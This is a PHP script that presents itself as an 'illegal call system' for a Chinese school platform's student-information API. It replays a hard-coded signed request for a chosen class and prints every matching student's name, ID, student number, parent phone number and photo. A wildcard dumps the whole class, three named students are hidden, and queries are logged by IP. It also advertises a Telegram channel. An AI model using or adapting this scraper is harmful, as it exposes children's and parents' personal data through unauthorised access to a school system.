<?php

// 假设班级和姓名通过GET参数传递
$class = $_GET['class'] ?? ''; // 原始班级ID
$name = $_GET['name'] ?? ''; // 姓名

// 验证输入
if (empty($class)) {
    die('班级ID不能为空');
}

// 禁止查询的姓名列表
$banned_names = ['蒋齐伦', '夏涵', '言菡依'];

// 计算新的班级ID
$classid = $class + 1358;

// 获取用户的IP地址
$user_ip = $_SERVER['REMOTE_ADDR'];

// 构造请求URL
$url = "https://edu.hishizi.com/api/api/student/class/list?periodId=$classid&version=1&timestamp=1734420796910&sign=3e43861e0b86ba70bd61685f54ec6b71";       

// 初始化cURL会话
$ch = curl_init($url);

// 设置cURL选项
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);

// 执行cURL请求
$response = curl_exec($ch);

// 关闭cURL会话
curl_close($ch);

// 将响应转换为JSON
$data = json_decode($response, true);

// 检查是否有数据
if (json_last_error() !== JSON_ERROR_NONE) {
    die('解析JSON失败: ' . json_last_error_msg());
}

// 检查响应码是否为200
if ($data['code'] != 200) {
    die('请求失败: ' . $data['msg']);
}

// 搜索姓名并展示信息
if (!empty($data['data'])) {
    foreach ($data['data'] as $student) {
        // 如果名字为*或者学生姓名包含查询的姓名
        if ($name == '*' || stripos($student['name'], $name) !== false) {
            // 检查学生姓名是否包含黑名单中的姓名
            $isBanned = false;
            foreach ($banned_names as $banned_name) {
                if (stripos($student['name'], $banned_name) !== false) {
                    $isBanned = true;
                    break;
                }
            }
            
            // 如果学生姓名不包含黑名单中的姓名，则展示信息
            if (!$isBanned) {
                echo "姓名: " . $student['name'] . "<br>";
                echo "学生ID: " . $student['id'] . "<br>";
                echo "学生编号: " . $student['studentNumber'] . "<br>";
                echo "家长联系电话: " . $student['homeSchoolPhone'] . "<br>";
                echo "<a href='photo.php?id=" . $student['id'] . "'><img src='https://edu.hishizi.com/api" . $student['picture'] . "' alt='学生照片'></a><br><br>";
            }
        }
    }
} else {
    echo "没有找到匹配的学生信息。";
}

// 获取当前时间
$logTime = date('Y-m-d H:i:s');

// 记录日志到rz.ini
$logMessage = "[" . $logTime . "] " . $name . " - " . $class . " - IP: " . $user_ip . "\n";
file_put_contents('rz.ini', $logMessage, FILE_APPEND);

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>学生信息api接口-By:Lun.|ps:目前只完全适配成章初二</title>
</head>
<body>
    <center><h1>有为云v2学生信息api接口非法调用系统-By:Lun.</h1></center>
    <center><h2>Telegram频道:@hysnhcz</h2></center>
</body>
</html>